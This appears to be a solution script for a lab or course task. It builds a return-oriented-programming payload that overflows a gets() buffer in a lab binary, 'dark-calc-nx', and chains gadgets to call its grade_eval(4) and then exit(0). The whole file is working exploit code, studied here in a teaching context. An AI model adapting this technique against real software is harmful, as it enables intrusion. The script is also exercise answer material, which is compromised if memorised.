#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx."""
import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


# dark-calc-nx is a non-PIE executable, so these code addresses are fixed.
POP_RDI = 0x401A33  # pop rdi; ret (unaligned, starts inside `pop r15; ret`)
RET = 0x401A40      # repz ret, used as a plain `ret`
GRADE_EVAL = 0x401978
EXIT_PLT = 0x4016E0

# input()'s frame:  expression[16] at rbp-0x10, saved rbp at rbp,
# return address at rbp+8.  gets() writes the chain upward from expression.
payload = (
    b"A" * 16           # 0x00  expression[16]
    + b"B" * 8          # 0x10  saved rbp (popped by `leave`, unused)
    + p64(POP_RDI)      # 0x18  input's `ret` jumps here
    + p64(4)            # 0x20  rdi = 4  -> grade_eval's `cmp $4`
    + p64(RET)          # 0x28  align rsp for grade_eval's printf
    + p64(GRADE_EVAL)   # 0x30  grade_eval(4)
    + p64(POP_RDI)      # 0x38  returned by grade_eval
    + p64(0)            # 0x40  rdi = 0  -> exit(0)
    + p64(RET)          # 0x48  align rsp for exit
    + p64(EXIT_PLT)     # 0x50  exit(0)
)

sys.stdout.buffer.write(payload)
